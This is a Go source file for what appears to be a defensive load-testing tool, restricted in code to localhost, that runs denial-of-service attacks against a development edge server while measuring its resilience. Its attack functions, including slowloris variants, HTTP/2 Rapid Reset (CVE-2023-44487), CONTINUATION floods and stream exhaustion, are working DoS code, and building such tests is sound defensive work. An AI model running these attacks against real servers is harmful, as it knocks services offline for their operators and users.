// edgeabuse runs one attack at a time against an acpwb_edge (the local dev
// stack — never production) while a canary keeps making ordinary requests,
// and reports how the edge held up: how quickly attack connections were
// cut off, and the canary's error rate and latency during the attack.
//
//	edgeabuse -attack slowhello -conns 2000 -for 30s
//	edgeabuse -attack all
//
// Attacks:
//
//	slowhello   half a ClientHello, then silence           (handshake timeout)
//	idletls     complete handshake, then silence           (header/idle timeout)
//	slowheaders headers one byte per second                (ReadHeaderTimeout)
//	slowbody    POST promising 100 KB, trickling it         (body read deadline)
//	slowread    request pages, never read the responses    (write deadline)
//	garbage     random bytes instead of TLS                 (no_hello, fast close)
//	handshakes  full TLS handshakes as fast as possible     (CPU)
//	rapidreset  HTTP/2 HEADERS + RST_STREAM in a loop       (CVE-2023-44487)
//	contflood   HTTP/2 HEADERS then endless CONTINUATION    (CVE-2024-27316 class)
//	streams     max out HTTP/2 concurrent streams           (MaxConcurrentStreams)
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"slices"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	addr    = flag.String("addr", "localhost:8001", "edge TLS address (dev stack only)")
	host    = flag.String("host", "acpwb.com", "Host / SNI")
	attack  = flag.String("attack", "all", "attack name, or all")
	conns   = flag.Int("conns", 1000, "concurrent attack connections")
	dur     = flag.Duration("for", 20*time.Second, "how long to run each attack")
	path    = flag.String("path", "/static/css/acpwb.css", "path the canary and request-based attacks use")
	bigPath = flag.String("bigpath", "/static/fonts/presentations/inter.zip", "large file for slowread")
	debug   = flag.String("debug", "127.0.0.1:6061", "edge debug listener (expvar), for resource sampling")
)

// The attack clients and the canary talk to the dev stack's self-signed
// cert: verification would only get in the way of measuring the server.
func tlsConf(protos ...string) *tls.Config {
	return &tls.Config{ServerName: *host, NextProtos: protos, InsecureSkipVerify: true}
}

type result struct {
	opened, closedByServer, failed atomic.Int64
	mu                             sync.Mutex
	lifetimes                      []time.Duration
}

func (r *result) closed(d time.Duration) {
	r.closedByServer.Add(1)
	r.mu.Lock()
	r.lifetimes = append(r.lifetimes, d)
	r.mu.Unlock()
}

// holdUntilClosed waits for the server to close c (or the attack to end).
func (r *result) holdUntilClosed(ctx context.Context, c net.Conn, start time.Time) {
	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			c.Close()
		case <-done:
		}
	}()
	io.Copy(io.Discard, c)
	close(done)
	if ctx.Err() == nil {
		r.closed(time.Since(start))
	}
	c.Close()
}

type attackFn func(ctx context.Context, r *result)

var attacks = map[string]attackFn{
	"slowhello": func(ctx context.Context, r *result) {
		hello := clientHello()
		pool(ctx, func() {
			start := time.Now()
			c, err := net.Dial("tcp", *addr)
			if err != nil {
				r.failed.Add(1)
				return
			}
			r.opened.Add(1)
			c.Write(hello[:len(hello)/3])
			r.holdUntilClosed(ctx, c, start)
		})
	},
	"idletls": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			start := time.Now()
			c, err := tls.Dial("tcp", *addr, tlsConf("http/1.1"))
			if err != nil {
				r.failed.Add(1)
				return
			}
			r.opened.Add(1)
			r.holdUntilClosed(ctx, c, start)
		})
	},
	"slowheaders": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			start := time.Now()
			c, err := tls.Dial("tcp", *addr, tlsConf("http/1.1"))
			if err != nil {
				r.failed.Add(1)
				return
			}
			r.opened.Add(1)
			go func() {
				req := "GET " + *path + " HTTP/1.1\r\nHost: " + *host + "\r\nX-Slow: "
				for i := 0; ctx.Err() == nil; i++ {
					if _, err := c.Write([]byte{req[min(i, len(req)-1)]}); err != nil {
						return
					}
					time.Sleep(time.Second)
				}
			}()
			r.holdUntilClosed(ctx, c, start)
		})
	},
	"slowbody": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			start := time.Now()
			c, err := tls.Dial("tcp", *addr, tlsConf("http/1.1"))
			if err != nil {
				r.failed.Add(1)
				return
			}
			r.opened.Add(1)
			fmt.Fprintf(c, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 100000\r\n\r\n", *path, *host)
			go func() {
				for ctx.Err() == nil {
					if _, err := c.Write([]byte("x")); err != nil {
						return
					}
					time.Sleep(time.Second)
				}
			}()
			r.holdUntilClosed(ctx, c, start)
		})
	},
	"slowread": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			start := time.Now()
			raw, err := net.Dial("tcp", *addr)
			if err != nil {
				r.failed.Add(1)
				return
			}
			raw.(*net.TCPConn).SetReadBuffer(4096)
			c := tls.Client(raw, tlsConf("http/1.1"))
			if c.Handshake() != nil {
				r.failed.Add(1)
				raw.Close()
				return
			}
			r.opened.Add(1)
			// Pipeline many requests and never read: the server's socket
			// buffer fills and its writes block until the write deadline.
			req := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", *bigPath, *host))
			go func() {
				for i := 0; i < 200 && ctx.Err() == nil; i++ {
					if _, err := c.Write(req); err != nil {
						return
					}
				}
			}()
			r.holdUntilClosed(ctx, raw, start) // reads nothing useful: the 4 KB buffer stays full
		})
	},
	"garbage": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			start := time.Now()
			c, err := net.Dial("tcp", *addr)
			if err != nil {
				r.failed.Add(1)
				return
			}
			r.opened.Add(1)
			junk := make([]byte, 512)
			rand.Read(junk)
			c.Write(junk)
			r.holdUntilClosed(ctx, c, start)
		})
	},
	"handshakes": func(ctx context.Context, r *result) {
		pool(ctx, func() {
			for ctx.Err() == nil {
				c, err := tls.Dial("tcp", *addr, tlsConf("http/1.1"))
				if err != nil {
					r.failed.Add(1)
					continue
				}
				r.opened.Add(1)
				c.Close()
			}
		})
	},
	"rapidreset": func(ctx context.Context, r *result) {
		h2attack(ctx, r, func(fr *http2.Framer, block []byte) error {
			for id := uint32(1); ctx.Err() == nil; id += 2 {
				if err := fr.WriteHeaders(http2.HeadersFrameParam{StreamID: id, BlockFragment: block, EndStream: true, EndHeaders: true}); err != nil {
					return err
				}
				if err := fr.WriteRSTStream(id, http2.ErrCodeCancel); err != nil {
					return err
				}
			}
			return nil
		})
	},
	"contflood": func(ctx context.Context, r *result) {
		h2attack(ctx, r, func(fr *http2.Framer, block []byte) error {
			if err := fr.WriteHeaders(http2.HeadersFrameParam{StreamID: 1, BlockFragment: block[:1]}); err != nil {
				return err
			}
			junk := bytes.Repeat([]byte{0x40, 0x01, 'a', 0x01, 'b'}, 3000) // literal headers, forever
			for ctx.Err() == nil {
				if err := fr.WriteContinuation(1, false, junk); err != nil {
					return err
				}
			}
			return nil
		})
	},
	"streams": func(ctx context.Context, r *result) {
		h2attack(ctx, r, func(fr *http2.Framer, block []byte) error {
			// Open streams without ever ending them (no END_STREAM, no body).
			for id := uint32(1); ctx.Err() == nil && id < 2000; id += 2 {
				if err := fr.WriteHeaders(http2.HeadersFrameParam{StreamID: id, BlockFragment: block, EndHeaders: true}); err != nil {
					return err
				}
			}
			<-ctx.Done()
			return nil
		})
	},
}

func h2attack(ctx context.Context, r *result, run func(*http2.Framer, []byte) error) {
	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	for _, f := range [][2]string{{":method", "GET"}, {":authority", *host}, {":scheme", "https"}, {":path", *path}} {
		enc.WriteField(hpack.HeaderField{Name: f[0], Value: f[1]})
	}
	block := hb.Bytes()
	pool(ctx, func() {
		start := time.Now()
		c, err := tls.Dial("tcp", *addr, tlsConf("h2"))
		if err != nil || c.ConnectionState().NegotiatedProtocol != "h2" {
			r.failed.Add(1)
			return
		}
		r.opened.Add(1)
		c.Write([]byte(http2.ClientPreface))
		fr := http2.NewFramer(c, c)
		fr.WriteSettings()
		go func() { run(fr, block) }()
		r.holdUntilClosed(ctx, c, start)
	})
}

// pool runs fn on *conns goroutines, restarting each as it returns, until
// ctx is done.
func pool(ctx context.Context, fn func()) {
	var wg sync.WaitGroup
	for range *conns {
		wg.Go(func() {
			for ctx.Err() == nil {
				fn()
			}
		})
	}
	wg.Wait()
}

func clientHello() []byte {
	a, b := net.Pipe()
	go func() { tls.Client(a, tlsConf("h2", "http/1.1")).Handshake(); a.Close() }()
	b.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 4096)
	n, _ := io.ReadAtLeast(b, buf, 200)
	b.Close()
	return buf[:n]
}

type canaryStats struct {
	ok, failed atomic.Int64
	mu         sync.Mutex
	lat        []time.Duration
	firstErr   string
}

// canary makes ordinary requests (fresh connection each time, so it also
// measures accepting and handshaking under load) until ctx is done.
func canary(ctx context.Context, s *canaryStats) {
	for ctx.Err() == nil {
		tr := &http.Transport{TLSClientConfig: tlsConf("h2", "http/1.1"), ForceAttemptHTTP2: true, DisableKeepAlives: true}
		cl := &http.Client{Transport: tr, Timeout: 10 * time.Second}
		req, _ := http.NewRequestWithContext(ctx, "GET", "https://"+*addr+*path, nil)
		req.Host = *host
		start := time.Now()
		resp, err := cl.Do(req)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		if ctx.Err() != nil {
			return
		}
		if err != nil || resp.StatusCode >= 500 {
			s.failed.Add(1)
			s.mu.Lock()
			if s.firstErr == "" {
				if err != nil {
					s.firstErr = err.Error()
				} else {
					s.firstErr = resp.Status
				}
			}
			s.mu.Unlock()
		} else {
			s.ok.Add(1)
			s.mu.Lock()
			s.lat = append(s.lat, time.Since(start))
			s.mu.Unlock()
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func pct(ds []time.Duration, p float64) time.Duration {
	if len(ds) == 0 {
		return 0
	}
	sort.Slice(ds, func(i, j int) bool { return ds[i] < ds[j] })
	return ds[min(len(ds)-1, int(float64(len(ds))*p))]
}

func run(name string) bool {
	fn := attacks[name]
	ctx, cancel := context.WithTimeout(context.Background(), *dur)
	defer cancel()
	var r result
	var cs canaryStats
	go canary(ctx, &cs)
	peak := map[string]int64{}
	go sample(ctx, peak)
	fn(ctx, &r)
	peakMu.Lock()
	ps := fmt.Sprintf("peak goroutines=%d conns=%d heap=%dMB", peak["goroutines"], peak["conns_open"], peak["heap"]>>20)
	peakMu.Unlock()

	r.mu.Lock()
	lt := slices.Clone(r.lifetimes)
	r.mu.Unlock()
	cs.mu.Lock()
	lat := slices.Clone(cs.lat)
	cs.mu.Unlock()
	healthy := cs.failed.Load() == 0 && cs.ok.Load() > 0
	verdict := "OK"
	if !healthy {
		verdict = "CANARY FAILED (" + cs.firstErr + ")"
	}
	fmt.Printf("%-11s opened=%-7d closed_by_server=%-7d lifetime p50=%-7v max=%-7v | %s | canary ok=%d fail=%d p50=%v p99=%v  %s\n",
		name, r.opened.Load(), r.closedByServer.Load(),
		pct(lt, 0.5).Round(time.Millisecond), pct(lt, 1).Round(time.Millisecond), ps,
		cs.ok.Load(), cs.failed.Load(), pct(lat, 0.5).Round(time.Millisecond), pct(lat, 0.99).Round(time.Millisecond), verdict)
	return healthy
}

func main() {
	flag.Parse()
	if !strings.HasPrefix(*addr, "localhost:") && !strings.HasPrefix(*addr, "127.0.0.1:") {
		log.Fatal("edgeabuse only runs against a local edge (localhost/127.0.0.1)")
	}
	names := []string{*attack}
	if *attack == "all" {
		names = []string{"garbage", "slowhello", "idletls", "slowheaders", "slowbody", "slowread",
			"handshakes", "rapidreset", "contflood", "streams"}
	}
	base := vars()
	fmt.Printf("baseline: goroutines=%d conns=%d heap=%dMB\n", base["goroutines"], base["conns_open"], base["heap"]>>20)
	ok := true
	for _, n := range names {
		if attacks[n] == nil {
			log.Fatalf("unknown attack %q", n)
		}
		ok = run(n) && ok
		time.Sleep(2 * time.Second) // let the edge settle between attacks
	}
	// Leak check: once the deadlines (≤ 2 min) have expired, everything the
	// attacks opened must be gone again.
	var v map[string]int64
	for deadline := time.Now().Add(150 * time.Second); time.Now().Before(deadline); time.Sleep(time.Second) {
		if v = vars(); v["conns_open"] == 0 && v["goroutines"] <= base["goroutines"]+20 {
			break
		}
	}
	fmt.Printf("after: goroutines=%d conns=%d heap=%dMB parser_panics=%d tap_panics=%d records_dropped=%d\n",
		v["goroutines"], v["conns_open"], v["heap"]>>20, v["parser_panics"], v["tap_panics"], v["records_dropped_conn"]+v["records_dropped_request"])
	if v["conns_open"] != 0 || v["goroutines"] > base["goroutines"]+20 || v["parser_panics"]+v["tap_panics"] != 0 {
		fmt.Println("LEAK/PANIC CHECK FAILED")
		ok = false
	}
	if !ok {
		os.Exit(1)
	}
	fmt.Println("PASS")
}

var peakMu sync.Mutex

// vars reads the edge's expvar counters (plus heap in use).
func vars() map[string]int64 {
	out := map[string]int64{}
	resp, err := http.Get("http://" + *debug + "/debug/vars")
	if err != nil {
		return out
	}
	defer resp.Body.Close()
	var v struct {
		Edge     map[string]int64 `json:"edge"`
		Memstats struct {
			HeapInuse int64
		} `json:"memstats"`
	}
	if json.NewDecoder(resp.Body).Decode(&v) == nil {
		out = v.Edge
		out["heap"] = v.Memstats.HeapInuse
	}
	return out
}

func sample(ctx context.Context, peak map[string]int64) {
	for ctx.Err() == nil {
		v := vars()
		peakMu.Lock()
		for _, k := range []string{"goroutines", "conns_open", "heap"} {
			peak[k] = max(peak[k], v[k])
		}
		peakMu.Unlock()
		time.Sleep(500 * time.Millisecond)
	}
}
